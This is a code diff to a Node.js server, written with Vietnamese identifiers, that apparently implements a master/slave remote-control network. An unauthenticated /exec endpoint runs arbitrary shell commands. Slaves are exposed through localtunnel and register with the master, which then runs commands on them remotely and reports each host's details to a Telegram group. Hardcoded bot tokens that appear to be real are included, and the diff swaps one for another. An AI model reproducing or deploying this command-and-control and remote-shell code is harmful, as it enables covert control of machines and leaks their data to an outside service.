@@ -1,5 +1,5 @@
 const express=require('express'),TelegramBot=require('node-telegram-bot-api'),localtunnel=require('localtunnel'),{exec}=require('child_process'),https=require('https'),os=require('os');
-const TOKEN='7898378784:AAH7RAql823WY3nE25ph28kyO2N20Rhqbts',ID_NHOM='7371969470',CONG=Math.floor(Math.random()*2000)+8000,TEN_MAY=os.hostname(),LA_MASTER=process.env.MASTER==='true',URL_MASTER=process.env.MASTER_URL;
+const TOKEN='7588647057:AAE_1kfJBAZggHQoVs7c1LVHaOBs2c6qGfU',ID_NHOM='7371969470',CONG=Math.floor(Math.random()*2000)+8000,TEN_MAY=os.hostname(),LA_MASTER=process.env.MASTER==='true',URL_MASTER=process.env.MASTER_URL;
 const app=express();app.use(express.json());const bot=new TelegramBot(TOKEN,{polling:false});
 let danhSachSlave=[],thoiDiemBatDau=Math.floor(Date.now()/1000);
 
@@ -39,7 +39,7 @@ app.post('/exec',(req,res)=>{chayLenh(req.body?.cmd||'',ketQua=>res.send(ketQua)
 app.get('/uptime',(req,res)=>{chayLenh('uptime',ketQua=>res.send(ketQua));});
 app.post('/register',(req,res)=>{const{port,url,hostname,report}=req.body||{};if(!port||!url||!hostname)return res.sendStatus(400);
   const stt=taoSTT();danhSachSlave=danhSachSlave.filter(s=>s.url!==url).concat({port,url,tenMay:hostname,lanCuoiPing:Date.now(),stt});
-  chayLenh('[ -f neofetch/neofetch ] && ./neofetch/neofetch --stdout || (git clone https://github.com/dylanaraps/neofetch && ./neofetch/neofetch --stdout)',ketQua=>guiTin(ID_NHOM,`📩 *Slave ${stt} đăng ký:*\n*Tên máy:* ${hostname}\n*Port:* ${port}\n*URL:* ${url}\n\n\`\`\`\n${ketQua||report||''}\n\`\`\``));res.sendStatus(200);
+  guiRequest({hostname:new URL(url).hostname,path:'/exec',method:'POST',headers:{'Content-Type':'application/json'}},JSON.stringify({cmd:'[ -f neofetch/neofetch ] && ./neofetch/neofetch --stdout || (git clone https://github.com/dylanaraps/neofetch && ./neofetch/neofetch --stdout)'}),ketQua=>guiTin(ID_NHOM,`📩 *Slave ${stt} đăng ký:*\n*Tên máy:* ${hostname}\n*Port:* ${port}\n*URL:* ${url}\n\n\`\`\`\n${ketQua||report||''}\n\`\`\``));res.sendStatus(200);
 });
 app.post('/ping',(req,res)=>{const slave=danhSachSlave.find(s=>s.url===req.body?.url);if(slave)slave.lanCuoiPing=Date.now();res.sendStatus(200);});
 
